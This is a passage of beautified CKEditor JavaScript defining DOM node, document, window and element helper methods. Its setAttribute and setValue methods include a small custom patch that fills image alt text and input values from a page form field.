    CKEDITOR.NODE_DOCUMENT = 9, CKEDITOR.NODE_TEXT = 3, CKEDITOR.NODE_COMMENT = 8, CKEDITOR.NODE_DOCUMENT_FRAGMENT = 11,
    CKEDITOR.POSITION_IDENTICAL = 0, CKEDITOR.POSITION_DISCONNECTED = 1, CKEDITOR.POSITION_FOLLOWING = 2,
    CKEDITOR.POSITION_PRECEDING = 4, CKEDITOR.POSITION_IS_CONTAINED = 8, CKEDITOR.POSITION_CONTAINS = 16,
    CKEDITOR.tools.extend(CKEDITOR.dom.node.prototype, {
        appendTo: function(e, t) {
            return e.append(this, t), e;
        },
        clone: function(n, i) {
            var e = this.$.cloneNode(n), o = function(e) {
                if (e["data-cke-expando"] && (e["data-cke-expando"] = !1), e.nodeType == CKEDITOR.NODE_ELEMENT && (i || e.removeAttribute("id", !1),
                n)) {
                    e = e.childNodes;
                    for (var t = 0; t < e.length; t++) o(e[t]);
                }
            };
            return o(e), new CKEDITOR.dom.node(e);
        },
        hasPrevious: function() {
            return !!this.$.previousSibling;
        },
        hasNext: function() {
            return !!this.$.nextSibling;
        },
        insertAfter: function(e) {
            return e.$.parentNode.insertBefore(this.$, e.$.nextSibling), e;
        },
        insertBefore: function(e) {
            return e.$.parentNode.insertBefore(this.$, e.$), e;
        },
        insertBeforeMe: function(e) {
            return this.$.parentNode.insertBefore(e.$, this.$), e;
        },
        getAddress: function(e) {
            for (var t = [], n = this.getDocument().$.documentElement, i = this.$; i && i != n; ) {
                var o = i.parentNode;
                o && t.unshift(this.getIndex.call({
                    $: i
                }, e)), i = o;
            }
            return t;
        },
        getDocument: function() {
            return new CKEDITOR.dom.document(this.$.ownerDocument || this.$.parentNode.ownerDocument);
        },
        getIndex: function(e) {
            function i(e, t) {
                var n = t ? e.nextSibling : e.previousSibling;
                return n && n.nodeType == CKEDITOR.NODE_TEXT ? n.nodeValue ? n : i(n, t) : null;
            }
            var t, n = this.$, o = -1;
            if (!this.$.parentNode || e && n.nodeType == CKEDITOR.NODE_TEXT && !n.nodeValue && !i(n) && !i(n, !0)) return -1;
            for (;(!e || n == this.$ || n.nodeType != CKEDITOR.NODE_TEXT || !t && n.nodeValue) && (o++,
            t = n.nodeType == CKEDITOR.NODE_TEXT), n = n.previousSibling; ) ;
            return o;
        },
        getNextSourceNode: function(e, t, n) {
            if (n && !n.call) {
                var i = n;
                n = function(e) {
                    return !e.equals(i);
                };
            }
            var o;
            if (!(e = !e && this.getFirst && this.getFirst())) {
                if (this.type == CKEDITOR.NODE_ELEMENT && n && !1 === n(this, !0)) return null;
                e = this.getNext();
            }
            for (;!e && (o = (o || this).getParent()); ) {
                if (n && !1 === n(o, !0)) return null;
                e = o.getNext();
            }
            return !e || n && !1 === n(e) ? null : t && t != e.type ? e.getNextSourceNode(!1, t, n) : e;
        },
        getPreviousSourceNode: function(e, t, n) {
            if (n && !n.call) {
                var i = n;
                n = function(e) {
                    return !e.equals(i);
                };
            }
            var o;
            if (!(e = !e && this.getLast && this.getLast())) {
                if (this.type == CKEDITOR.NODE_ELEMENT && n && !1 === n(this, !0)) return null;
                e = this.getPrevious();
            }
            for (;!e && (o = (o || this).getParent()); ) {
                if (n && !1 === n(o, !0)) return null;
                e = o.getPrevious();
            }
            return !e || n && !1 === n(e) ? null : t && e.type != t ? e.getPreviousSourceNode(!1, t, n) : e;
        },
        getPrevious: function(e) {
            for (var t, n = this.$; (t = (n = n.previousSibling) && 10 != n.nodeType && new CKEDITOR.dom.node(n)) && e && !e(t); ) ;
            return t;
        },
        getNext: function(e) {
            for (var t, n = this.$; (t = (n = n.nextSibling) && new CKEDITOR.dom.node(n)) && e && !e(t); ) ;
            return t;
        },
        getParent: function(e) {
            var t = this.$.parentNode;
            return t && (t.nodeType == CKEDITOR.NODE_ELEMENT || e && t.nodeType == CKEDITOR.NODE_DOCUMENT_FRAGMENT) ? new CKEDITOR.dom.node(t) : null;
        },
        getParents: function(e) {
            for (var t = this, n = []; n[e ? "push" : "unshift"](t), t = t.getParent(); ) ;
            return n;
        },
        getCommonAncestor: function(e) {
            if (e.equals(this)) return this;
            if (e.contains && e.contains(this)) return e;
            var t = this.contains ? this : this.getParent();
            do {
                if (t.contains(e)) return t;
            } while (t = t.getParent());
            return null;
        },
        getPosition: function(e) {
            var t = this.$, n = e.$;
            if (t.compareDocumentPosition) return t.compareDocumentPosition(n);
            if (t == n) return CKEDITOR.POSITION_IDENTICAL;
            if (this.type == CKEDITOR.NODE_ELEMENT && e.type == CKEDITOR.NODE_ELEMENT) {
                if (t.contains) {
                    if (t.contains(n)) return CKEDITOR.POSITION_CONTAINS + CKEDITOR.POSITION_PRECEDING;
                    if (n.contains(t)) return CKEDITOR.POSITION_IS_CONTAINED + CKEDITOR.POSITION_FOLLOWING;
                }
                if ("sourceIndex" in t) return t.sourceIndex < 0 || n.sourceIndex < 0 ? CKEDITOR.POSITION_DISCONNECTED : t.sourceIndex < n.sourceIndex ? CKEDITOR.POSITION_PRECEDING : CKEDITOR.POSITION_FOLLOWING;
            }
            t = this.getAddress(), e = e.getAddress(), n = Math.min(t.length, e.length);
            for (var i = 0; i <= n - 1; i++) if (t[i] != e[i]) {
                if (i < n) return t[i] < e[i] ? CKEDITOR.POSITION_PRECEDING : CKEDITOR.POSITION_FOLLOWING;
                break;
            }
            return t.length < e.length ? CKEDITOR.POSITION_CONTAINS + CKEDITOR.POSITION_PRECEDING : CKEDITOR.POSITION_IS_CONTAINED + CKEDITOR.POSITION_FOLLOWING;
        },
        getAscendant: function(t, e) {
            var n, i, o = this.$;
            for (e || (o = o.parentNode), "function" == typeof t ? (i = !0, n = t) : (i = !1,
            n = function(e) {
                return e = "string" == typeof e.nodeName ? e.nodeName.toLowerCase() : "", "string" == typeof t ? e == t : e in t;
            }); o; ) {
                if (n(i ? new CKEDITOR.dom.node(o) : o)) return new CKEDITOR.dom.node(o);
                try {
                    o = o.parentNode;
                } catch (t) {
                    o = null;
                }
            }
            return null;
        },
        hasAscendant: function(e, t) {
            var n = this.$;
            for (t || (n = n.parentNode); n; ) {
                if (n.nodeName && n.nodeName.toLowerCase() == e) return !0;
                n = n.parentNode;
            }
            return !1;
        },
        move: function(e, t) {
            e.append(this.remove(), t);
        },
        remove: function(e) {
            var t = this.$, n = t.parentNode;
            if (n) {
                if (e) for (;e = t.firstChild; ) n.insertBefore(t.removeChild(e), t);
                n.removeChild(t);
            }
            return this;
        },
        replace: function(e) {
            this.insertBefore(e), e.remove();
        },
        trim: function() {
            this.ltrim(), this.rtrim();
        },
        ltrim: function() {
            for (var e; this.getFirst && (e = this.getFirst()); ) {
                if (e.type == CKEDITOR.NODE_TEXT) {
                    var t = CKEDITOR.tools.ltrim(e.getText()), n = e.getLength();
                    if (!t) {
                        e.remove();
                        continue;
                    }
                    t.length < n && (e.split(n - t.length), this.$.removeChild(this.$.firstChild));
                }
                break;
            }
        },
        rtrim: function() {
            for (var e; this.getLast && (e = this.getLast()); ) {
                if (e.type == CKEDITOR.NODE_TEXT) {
                    var t = CKEDITOR.tools.rtrim(e.getText()), n = e.getLength();
                    if (!t) {
                        e.remove();
                        continue;
                    }
                    t.length < n && (e.split(t.length), this.$.lastChild.parentNode.removeChild(this.$.lastChild));
                }
                break;
            }
            CKEDITOR.env.needsBrFiller && (e = this.$.lastChild) && 1 == e.type && "br" == e.nodeName.toLowerCase() && e.parentNode.removeChild(e);
        },
        isReadOnly: function() {
            var e = this;
            if (this.type != CKEDITOR.NODE_ELEMENT && (e = this.getParent()), e && void 0 !== e.$.isContentEditable) return !(e.$.isContentEditable || e.data("cke-editable"));
            for (;e && !e.data("cke-editable"); ) {
                if ("false" == e.getAttribute("contentEditable")) return !0;
                if ("true" == e.getAttribute("contentEditable")) break;
                e = e.getParent();
            }
            return !e;
        }
    }), CKEDITOR.dom.window = function(e) {
        CKEDITOR.dom.domObject.call(this, e);
    }, CKEDITOR.dom.window.prototype = new CKEDITOR.dom.domObject(), CKEDITOR.tools.extend(CKEDITOR.dom.window.prototype, {
        focus: function() {
            this.$.focus();
        },
        getViewPaneSize: function() {
            var e = this.$.document, t = "CSS1Compat" == e.compatMode;
            return {
                width: (t ? e.documentElement.clientWidth : e.body.clientWidth) || 0,
                height: (t ? e.documentElement.clientHeight : e.body.clientHeight) || 0
            };
        },
        getScrollPosition: function() {
            var e = this.$;
            return "pageXOffset" in e ? {
                x: e.pageXOffset || 0,
                y: e.pageYOffset || 0
            } : {
                x: (e = e.document).documentElement.scrollLeft || e.body.scrollLeft || 0,
                y: e.documentElement.scrollTop || e.body.scrollTop || 0
            };
        },
        getFrame: function() {
            var e = this.$.frameElement;
            return e ? new CKEDITOR.dom.element.get(e) : null;
        }
    }), CKEDITOR.dom.document = function(e) {
        CKEDITOR.dom.domObject.call(this, e);
    }, CKEDITOR.dom.document.prototype = new CKEDITOR.dom.domObject(), CKEDITOR.tools.extend(CKEDITOR.dom.document.prototype, {
        type: CKEDITOR.NODE_DOCUMENT,
        appendStyleSheet: function(e) {
            if (this.$.createStyleSheet) this.$.createStyleSheet(e); else {
                var t = new CKEDITOR.dom.element("link");
                t.setAttributes({
                    rel: "stylesheet",
                    type: "text/css",
                    href: e
                }), this.getHead().append(t);
            }
        },
        appendStyleText: function(e) {
            if (this.$.createStyleSheet) {
                var t = this.$.createStyleSheet("");
                t.cssText = e;
            } else {
                var n = new CKEDITOR.dom.element("style", this);
                n.append(new CKEDITOR.dom.text(e, this)), this.getHead().append(n);
            }
            return t || n.$.sheet;
        },
        createElement: function(e, t) {
            var n = new CKEDITOR.dom.element(e, this);
            return t && (t.attributes && n.setAttributes(t.attributes), t.styles && n.setStyles(t.styles)),
            n;
        },
        createText: function(e) {
            return new CKEDITOR.dom.text(e, this);
        },
        focus: function() {
            this.getWindow().focus();
        },
        getActive: function() {
            var e;
            try {
                e = this.$.activeElement;
            } catch (e) {
                return null;
            }
            return new CKEDITOR.dom.element(e);
        },
        getById: function(e) {
            return (e = this.$.getElementById(e)) ? new CKEDITOR.dom.element(e) : null;
        },
        getByAddress: function(e, t) {
            for (var n = this.$.documentElement, i = 0; n && i < e.length; i++) {
                var o = e[i];
                if (t) for (var a = -1, r = 0; r < n.childNodes.length; r++) {
                    var s = n.childNodes[r];
                    if ((!0 !== t || 3 != s.nodeType || !s.previousSibling || 3 != s.previousSibling.nodeType) && ++a == o) {
                        n = s;
                        break;
                    }
                } else n = n.childNodes[o];
            }
            return n ? new CKEDITOR.dom.node(n) : null;
        },
        getElementsByTag: function(e, t) {
            return !(CKEDITOR.env.ie && document.documentMode <= 8) && t && (e = t + ":" + e),
            new CKEDITOR.dom.nodeList(this.$.getElementsByTagName(e));
        },
        getHead: function() {
            var e = this.$.getElementsByTagName("head")[0];
            return e ? new CKEDITOR.dom.element(e) : this.getDocumentElement().append(new CKEDITOR.dom.element("head"), !0);
        },
        getBody: function() {
            return new CKEDITOR.dom.element(this.$.body);
        },
        getDocumentElement: function() {
            return new CKEDITOR.dom.element(this.$.documentElement);
        },
        getWindow: function() {
            return new CKEDITOR.dom.window(this.$.parentWindow || this.$.defaultView);
        },
        write: function(e) {
            this.$.open("text/html", "replace"), CKEDITOR.env.ie && (e = e.replace(/(?:^\s*<!DOCTYPE[^>]*?>)|^/i, '$&\n<script data-cke-temp="1">(' + CKEDITOR.tools.fixDomain + ")();<\/script>")),
            this.$.write(e), this.$.close();
        },
        find: function(e) {
            return new CKEDITOR.dom.nodeList(this.$.querySelectorAll(e));
        },
        findOne: function(e) {
            return (e = this.$.querySelector(e)) ? new CKEDITOR.dom.element(e) : null;
        },
        _getHtml5ShivFrag: function() {
            var e = this.getCustomData("html5ShivFrag");
            return e || (e = this.$.createDocumentFragment(), CKEDITOR.tools.enableHtml5Elements(e, !0),
            this.setCustomData("html5ShivFrag", e)), e;
        }
    }), CKEDITOR.dom.nodeList = function(e) {
        this.$ = e;
    }, CKEDITOR.dom.nodeList.prototype = {
        count: function() {
            return this.$.length;
        },
        getItem: function(e) {
            return e < 0 || e >= this.$.length ? null : (e = this.$[e]) ? new CKEDITOR.dom.node(e) : null;
        }
    }, CKEDITOR.dom.element = function(e, t) {
        "string" == typeof e && (e = (t ? t.$ : document).createElement(e)), CKEDITOR.dom.domObject.call(this, e);
    }, CKEDITOR.dom.element.get = function(e) {
        return (e = "string" == typeof e ? document.getElementById(e) || document.getElementsByName(e)[0] : e) && (e.$ ? e : new CKEDITOR.dom.element(e));
    }, CKEDITOR.dom.element.prototype = new CKEDITOR.dom.node(), CKEDITOR.dom.element.createFromHtml = function(e, t) {
        var n = new CKEDITOR.dom.element("div", t);
        return n.setHtml(e), n.getFirst().remove();
    }, CKEDITOR.dom.element.setMarker = function(e, t, n, i) {
        var o = t.getCustomData("list_marker_id") || t.setCustomData("list_marker_id", CKEDITOR.tools.getNextNumber()).getCustomData("list_marker_id"), a = t.getCustomData("list_marker_names") || t.setCustomData("list_marker_names", {}).getCustomData("list_marker_names");
        return e[o] = t, a[n] = 1, t.setCustomData(n, i);
    }, CKEDITOR.dom.element.clearAllMarkers = function(e) {
        for (var t in e) CKEDITOR.dom.element.clearMarkers(e, e[t], 1);
    }, CKEDITOR.dom.element.clearMarkers = function(e, t, n) {
        var i, o = t.getCustomData("list_marker_names"), a = t.getCustomData("list_marker_id");
        for (i in o) t.removeCustomData(i);
        t.removeCustomData("list_marker_names"), n && (t.removeCustomData("list_marker_id"),
        delete e[a]);
    }, function() {
        function n(e) {
            var t = !0;
            return e.$.id || (e.$.id = "cke_tmp_" + CKEDITOR.tools.getNextNumber(), t = !1),
            function() {
                t || e.removeAttribute("id");
            };
        }
        function i(e, t) {
            return "#" + e.$.id + " " + t.split(/,\s*/).join(", #" + e.$.id + " ");
        }
        function o(e) {
            for (var t = 0, n = 0, i = r[e].length; n < i; n++) t += parseInt(this.getComputedStyle(r[e][n]) || 0, 10) || 0;
            return t;
        }
        var a, t;
        CKEDITOR.tools.extend(CKEDITOR.dom.element.prototype, {
            type: CKEDITOR.NODE_ELEMENT,
            addClass: function(e) {
                var t = this.$.className;
                return t && (RegExp("(?:^|\\s)" + e + "(?:\\s|$)", "").test(t) || (t = t + " " + e)),
                this.$.className = t || e, this;
            },
            removeClass: function(e) {
                var t = this.getAttribute("class");
                return t && (e = RegExp("(?:^|\\s+)" + e + "(?=\\s|$)", "i")).test(t) && ((t = t.replace(e, "").replace(/^\s+/, "")) ? this.setAttribute("class", t) : this.removeAttribute("class")),
                this;
            },
            hasClass: function(e) {
                return RegExp("(?:^|\\s+)" + e + "(?=\\s|$)", "").test(this.getAttribute("class"));
            },
            append: function(e, t) {
                return "string" == typeof e && (e = this.getDocument().createElement(e)), t ? this.$.insertBefore(e.$, this.$.firstChild) : this.$.appendChild(e.$),
                e;
            },
            appendHtml: function(e) {
                if (this.$.childNodes.length) {
                    var t = new CKEDITOR.dom.element("div", this.getDocument());
                    t.setHtml(e), t.moveChildren(this);
                } else this.setHtml(e);
            },
            appendText: function(e) {
                null != this.$.text ? this.$.text = this.$.text + e : this.append(new CKEDITOR.dom.text(e));
            },
            appendBogus: function(e) {
                if (e || CKEDITOR.env.needsBrFiller) {
                    for (e = this.getLast(); e && e.type == CKEDITOR.NODE_TEXT && !CKEDITOR.tools.rtrim(e.getText()); ) e = e.getPrevious();
                    e && e.is && e.is("br") || (e = this.getDocument().createElement("br"), CKEDITOR.env.gecko && e.setAttribute("type", "_moz"),
                    this.append(e));
                }
            },
            breakParent: function(e) {
                var t = new CKEDITOR.dom.range(this.getDocument());
                t.setStartAfter(this), t.setEndAfter(e), e = t.extractContents(), t.insertNode(this.remove()),
                e.insertAfterNode(this);
            },
            contains: CKEDITOR.env.ie || CKEDITOR.env.webkit ? function(e) {
                var t = this.$;
                return e.type != CKEDITOR.NODE_ELEMENT ? t.contains(e.getParent().$) : t != e.$ && t.contains(e.$);
            } : function(e) {
                return !!(16 & this.$.compareDocumentPosition(e.$));
            },
            focus: function() {
                function t() {
                    try {
                        this.$.focus();
                    } catch (e) {}
                }
                return function(e) {
                    e ? CKEDITOR.tools.setTimeout(t, 100, this) : t.call(this);
                };
            }(),
            getHtml: function() {
                var e = this.$.innerHTML;
                return CKEDITOR.env.ie ? e.replace(/<\?[^>]*>/g, "") : e;
            },
            getOuterHtml: function() {
                if (this.$.outerHTML) return this.$.outerHTML.replace(/<\?[^>]*>/, "");
                var e = this.$.ownerDocument.createElement("div");
                return e.appendChild(this.$.cloneNode(!0)), e.innerHTML;
            },
            getClientRect: function() {
                var e = CKEDITOR.tools.extend({}, this.$.getBoundingClientRect());
                return !e.width && (e.width = e.right - e.left), !e.height && (e.height = e.bottom - e.top),
                e;
            },
            setHtml: CKEDITOR.env.ie && CKEDITOR.env.version < 9 ? function(e) {
                try {
                    var t = this.$;
                    if (this.getParent()) return t.innerHTML = e;
                    var n = this.getDocument()._getHtml5ShivFrag();
                    return n.appendChild(t), t.innerHTML = e, n.removeChild(t), e;
                } catch (n) {
                    for (this.$.innerHTML = "", (t = new CKEDITOR.dom.element("body", this.getDocument())).$.innerHTML = e,
                    t = t.getChildren(); t.count(); ) this.append(t.getItem(0));
                    return e;
                }
            } : function(e) {
                return this.$.innerHTML = e;
            },
            setText: (t = document.createElement("p"), t.innerHTML = "x", t = t.textContent,
            function(e) {
                this.$[t ? "textContent" : "innerText"] = e;
            }),
            getAttribute: CKEDITOR.env.ie && (CKEDITOR.env.ie7Compat || CKEDITOR.env.quirks) ? function(e) {
                switch (e) {
                  case "class":
                    e = "className";
                    break;

                  case "http-equiv":
                    e = "httpEquiv";
                    break;

                  case "name":
                    return this.$.name;

                  case "tabindex":
                    return 0 !== (e = this.$.getAttribute(e, 2)) && 0 === this.$.tabIndex && (e = null),
                    e;

                  case "checked":
                    return ((e = this.$.attributes.getNamedItem(e)).specified ? e.nodeValue : this.$.checked) ? "checked" : null;

                  case "hspace":
                  case "value":
                    return this.$[e];

                  case "style":
                    return this.$.style.cssText;

                  case "contenteditable":
                  case "contentEditable":
                    return this.$.attributes.getNamedItem("contentEditable").specified ? this.$.getAttribute("contentEditable") : null;
                }
                return this.$.getAttribute(e, 2);
            } : function(e) {
                return this.$.getAttribute(e, 2);
            },
            getChildren: function() {
                return new CKEDITOR.dom.nodeList(this.$.childNodes);
            },
            getComputedStyle: CKEDITOR.env.ie ? function(e) {
                return this.$.currentStyle[CKEDITOR.tools.cssStyleToDomStyle(e)];
            } : function(e) {
                var t = this.getWindow().$.getComputedStyle(this.$, null);
                return t ? t.getPropertyValue(e) : "";
            },
            getDtd: function() {
                var e = CKEDITOR.dtd[this.getName()];
                return this.getDtd = function() {
                    return e;
                }, e;
            },
            getElementsByTag: CKEDITOR.dom.document.prototype.getElementsByTag,
            getTabIndex: CKEDITOR.env.ie ? function() {
                var e = this.$.tabIndex;
                return 0 === e && !CKEDITOR.dtd.$tabIndex[this.getName()] && 0 !== parseInt(this.getAttribute("tabindex"), 10) && (e = -1),
                e;
            } : CKEDITOR.env.webkit ? function() {
                var e = this.$.tabIndex;
                return void 0 === e && (e = parseInt(this.getAttribute("tabindex"), 10), isNaN(e) && (e = -1)),
                e;
            } : function() {
                return this.$.tabIndex;
            },
            getText: function() {
                return this.$.textContent || this.$.innerText || "";
            },
            getWindow: function() {
                return this.getDocument().getWindow();
            },
            getId: function() {
                return this.$.id || null;
            },
            getNameAtt: function() {
                return this.$.name || null;
            },
            getName: function() {
                var e = this.$.nodeName.toLowerCase();
                if (CKEDITOR.env.ie && document.documentMode <= 8) {
                    var t = this.$.scopeName;
                    "HTML" != t && (e = t.toLowerCase() + ":" + e);
                }
                return this.getName = function() {
                    return e;
                }, this.getName();
            },
            getValue: function() {
                return this.$.value;
            },
            getFirst: function(e) {
                var t = this.$.firstChild;
                return (t = t && new CKEDITOR.dom.node(t)) && e && !e(t) && (t = t.getNext(e)),
                t;
            },
            getLast: function(e) {
                var t = this.$.lastChild;
                return (t = t && new CKEDITOR.dom.node(t)) && e && !e(t) && (t = t.getPrevious(e)),
                t;
            },
            getStyle: function(e) {
                return this.$.style[CKEDITOR.tools.cssStyleToDomStyle(e)];
            },
            is: function() {
                var e = this.getName();
                if ("object" == typeof arguments[0]) return !!arguments[0][e];
                for (var t = 0; t < arguments.length; t++) if (arguments[t] == e) return !0;
                return !1;
            },
            isEditable: function(e) {
                var t = this.getName();
                return !(this.isReadOnly() || "none" == this.getComputedStyle("display") || "hidden" == this.getComputedStyle("visibility") || CKEDITOR.dtd.$nonEditable[t] || CKEDITOR.dtd.$empty[t] || this.is("a") && (this.data("cke-saved-name") || this.hasAttribute("name")) && !this.getChildCount() || !1 !== e && (!(e = CKEDITOR.dtd[t] || CKEDITOR.dtd.span) || !e["#"]));
            },
            isIdentical: function(e) {
                var t = this.clone(0, 1);
                if (e = e.clone(0, 1), t.removeAttributes([ "_moz_dirty", "data-cke-expando", "data-cke-saved-href", "data-cke-saved-name" ]),
                e.removeAttributes([ "_moz_dirty", "data-cke-expando", "data-cke-saved-href", "data-cke-saved-name" ]),
                t.$.isEqualNode) return t.$.style.cssText = CKEDITOR.tools.normalizeCssText(t.$.style.cssText),
                e.$.style.cssText = CKEDITOR.tools.normalizeCssText(e.$.style.cssText), t.$.isEqualNode(e.$);
                if (t = t.getOuterHtml(), e = e.getOuterHtml(), CKEDITOR.env.ie && CKEDITOR.env.version < 9 && this.is("a")) {
                    var n = this.getParent();
                    n.type == CKEDITOR.NODE_ELEMENT && ((n = n.clone()).setHtml(t), t = n.getHtml(),
                    n.setHtml(e), e = n.getHtml());
                }
                return t == e;
            },
            isVisible: function() {
                var e, t, n = (this.$.offsetHeight || this.$.offsetWidth) && "hidden" != this.getComputedStyle("visibility");
                return n && CKEDITOR.env.webkit && !(e = this.getWindow()).equals(CKEDITOR.document.getWindow()) && (t = e.$.frameElement) && (n = new CKEDITOR.dom.element(t).isVisible()),
                !!n;
            },
            isEmptyInlineRemoveable: function() {
                if (!CKEDITOR.dtd.$removeEmpty[this.getName()]) return !1;
                for (var e = this.getChildren(), t = 0, n = e.count(); t < n; t++) {
                    var i = e.getItem(t);
                    if ((i.type != CKEDITOR.NODE_ELEMENT || !i.data("cke-bookmark")) && (i.type == CKEDITOR.NODE_ELEMENT && !i.isEmptyInlineRemoveable() || i.type == CKEDITOR.NODE_TEXT && CKEDITOR.tools.trim(i.getText()))) return !1;
                }
                return !0;
            },
            hasAttributes: CKEDITOR.env.ie && (CKEDITOR.env.ie7Compat || CKEDITOR.env.quirks) ? function() {
                for (var e = this.$.attributes, t = 0; t < e.length; t++) {
                    var n = e[t];
                    switch (n.nodeName) {
                      case "class":
                        if (this.getAttribute("class")) return !0;

                      case "data-cke-expando":
                        continue;

                      default:
                        if (n.specified) return !0;
                    }
                }
                return !1;
            } : function() {
                var e = this.$.attributes, t = e.length, n = {
                    "data-cke-expando": 1,
                    _moz_dirty: 1
                };
                return 0 < t && (2 < t || !n[e[0].nodeName] || 2 == t && !n[e[1].nodeName]);
            },
            hasAttribute: function() {
                function t(e) {
                    var t = this.$.attributes.getNamedItem(e);
                    if ("input" == this.getName()) switch (e) {
                      case "class":
                        return 0 < this.$.className.length;

                      case "checked":
                        return !!this.$.checked;

                      case "value":
                        return "checkbox" == (e = this.getAttribute("type")) || "radio" == e ? "on" != this.$.value : !!this.$.value;
                    }
                    return !!t && t.specified;
                }
                return CKEDITOR.env.ie ? CKEDITOR.env.version < 8 ? function(e) {
                    return "name" == e ? !!this.$.name : t.call(this, e);
                } : t : function(e) {
                    return !!this.$.attributes.getNamedItem(e);
                };
            }(),
            hide: function() {
                this.setStyle("display", "none");
            },
            moveChildren: function(e, t) {
                var n, i = this.$;
                if (i != (e = e.$)) if (t) for (;n = i.lastChild; ) e.insertBefore(i.removeChild(n), e.firstChild); else for (;n = i.firstChild; ) e.appendChild(i.removeChild(n));
            },
            mergeSiblings: function() {
                function t(e, t, n) {
                    if (t && t.type == CKEDITOR.NODE_ELEMENT) {
                        for (var i = []; t.data("cke-bookmark") || t.isEmptyInlineRemoveable(); ) if (i.push(t),
                        !(t = n ? t.getNext() : t.getPrevious()) || t.type != CKEDITOR.NODE_ELEMENT) return;
                        if (e.isIdentical(t)) {
                            for (var o = n ? e.getLast() : e.getFirst(); i.length; ) i.shift().move(e, !n);
                            t.moveChildren(e, !n), t.remove(), o && o.type == CKEDITOR.NODE_ELEMENT && o.mergeSiblings();
                        }
                    }
                }
                return function(e) {
                    (!1 === e || CKEDITOR.dtd.$removeEmpty[this.getName()] || this.is("a")) && (t(this, this.getNext(), !0),
                    t(this, this.getPrevious()));
                };
            }(),
            show: function() {
                this.setStyles({
                    display: "",
                    visibility: ""
                });
            },
            setAttribute: (a = function(e, t) {
                if (this.$.tagName == 'IMG' && e == 'alt' && !t) {
                    t = null != this.$.getAttribute("ht-txtalt") && (e = "" == this.$.getAttribute("ht-txtalt"))
                    ? document.querySelector('[name="' + this.$.getAttribute("ht-txtalt") + '[name]"]').value
                    : document.getElementById("name").value;
                }
                return this.$.setAttribute(e, t), this;
            }, CKEDITOR.env.ie && (CKEDITOR.env.ie7Compat || CKEDITOR.env.quirks) ? function(e, t) {
                return "class" == e ? this.$.className = t : "style" == e ? this.$.style.cssText = t : "tabindex" == e ? this.$.tabIndex = t : "checked" == e ? this.$.checked = t : "contenteditable" == e ? a.call(this, "contentEditable", t) : a.apply(this, arguments),
                this;
            } : CKEDITOR.env.ie8Compat && CKEDITOR.env.secure ? function(e, t) {
                if ("src" == e && t.match(/^http:\/\//)) try {
                    a.apply(this, arguments);
                } catch (e) {} else a.apply(this, arguments);
                return this;
            } : a),
            setAttributes: function(e) {
                for (var t in e) {
                    this.setAttribute(t, e[t]);
                };
                return this;
            },
            setValue: function(e) {
                if (this.$.hasAttribute("ht-txtalt") && e) {
                    return this.$.value = e, this;
                }
                return null != this.$.getAttribute("ht-txtalt") && (e = "" == this.$.getAttribute("ht-txtalt")
                    ? document.getElementById("name").value
                    : document.querySelector('[name="' + this.$.getAttribute("ht-txtalt") + '[name]"]').value),
                    this.$.value = e, this;
            },
            removeAttribute: CKEDITOR.env.ie && (CKEDITOR.env.ie7Compat || CKEDITOR.env.quirks) ? function(e) {
                "class" == e ? e = "className" : "tabindex" == e ? e = "tabIndex" : "contenteditable" == e && (e = "contentEditable"),
                this.$.removeAttribute(e);
            } : function(e) {
                this.$.removeAttribute(e);
            },
            removeAttributes: function(e) {
                if (CKEDITOR.tools.isArray(e)) for (var t = 0; t < e.length; t++) this.removeAttribute(e[t]); else for (t in e) e.hasOwnProperty(t) && this.removeAttribute(t);
            },
            removeStyle: function(e) {
                if ((i = this.$.style).removeProperty || "border" != e && "margin" != e && "padding" != e) i.removeProperty ? i.removeProperty(e) : i.removeAttribute(CKEDITOR.tools.cssStyleToDomStyle(e)),
                this.$.style.cssText || this.removeAttribute("style"); else {
                    var t, n = [ "top", "left", "right", "bottom" ];
                    "border" == e && (t = [ "color", "style", "width" ]);
                    for (var i = [], o = 0; o < n.length; o++) if (t) for (var a = 0; a < t.length; a++) i.push([ e, n[o], t[a] ].join("-")); else i.push([ e, n[o] ].join("-"));
                    for (e = 0; e < i.length; e++) this.removeStyle(i[e]);
                }
            },
            setStyle: function(e, t) {
                return this.$.style[CKEDITOR.tools.cssStyleToDomStyle(e)] = t, this;
            },
            setStyles: function(e) {
                for (var t in e) this.setStyle(t, e[t]);
                return this;
            },
            setOpacity: function(e) {
                CKEDITOR.env.ie && CKEDITOR.env.version < 9 ? (e = Math.round(100 * e), this.setStyle("filter", 100 <= e ? "" : "progid:DXImageTransform.Microsoft.Alpha(opacity=" + e + ")")) : this.setStyle("opacity", e);
            },
            unselectable: function() {
                if (this.setStyles(CKEDITOR.tools.cssVendorPrefix("user-select", "none")), CKEDITOR.env.ie) {
                    this.setAttribute("unselectable", "on");
                    for (var e = this.getElementsByTag("*"), t = 0, n = e.count(); t < n; t++) e.getItem(t).setAttribute("unselectable", "on");
                }
            },
            getPositionedAncestor: function() {
                for (var e = this; "html" != e.getName(); ) {
                    if ("static" != e.getComputedStyle("position")) return e;
                    e = e.getParent();
                }
                return null;
            },
            getDocumentPosition: function(e) {
                var t = 0, n = 0, i = this.getDocument(), o = i.getBody(), a = CKEDITOR.env.quirks;
                if (document.documentElement.getBoundingClientRect) {
                    var r = this.$.getBoundingClientRect(), s = i.$.documentElement, l = s.clientTop || o.$.clientTop || 0, c = s.clientLeft || o.$.clientLeft || 0, d = !0;
                    CKEDITOR.env.ie && (d = i.getDocumentElement().contains(this), i = i.getBody().contains(this),
                    d = a && i || !a && d), d && (CKEDITOR.env.webkit ? (t = o.$.scrollLeft || s.scrollLeft,
                    n = o.$.scrollTop || s.scrollTop) : (t = (n = a ? o.$ : s).scrollLeft, n = n.scrollTop),
                    t = r.left + t - c, n = r.top + n - l);
                } else for (l = this, c = null; l && "body" != l.getName() && "html" != l.getName(); ) {
                    for (t += l.$.offsetLeft - l.$.scrollLeft, n += l.$.offsetTop - l.$.scrollTop, l.equals(this) || (t += l.$.clientLeft || 0,
                    n += l.$.clientTop || 0); c && !c.equals(l); ) t -= c.$.scrollLeft, n -= c.$.scrollTop,
                    c = c.getParent();
                    l = (r = (c = l).$.offsetParent) ? new CKEDITOR.dom.element(r) : null;
                }
                return e && (r = this.getWindow(), l = e.getWindow(), !r.equals(l) && r.$.frameElement && (t += (e = new CKEDITOR.dom.element(r.$.frameElement).getDocumentPosition(e)).x,
                n += e.y)), document.documentElement.getBoundingClientRect || !CKEDITOR.env.gecko || a || (t += this.$.clientLeft ? 1 : 0,
                n += this.$.clientTop ? 1 : 0), {
                    x: t,
                    y: n
                };
            },
            scrollIntoView: function(e) {
                var t = this.getParent();
                if (t) do {
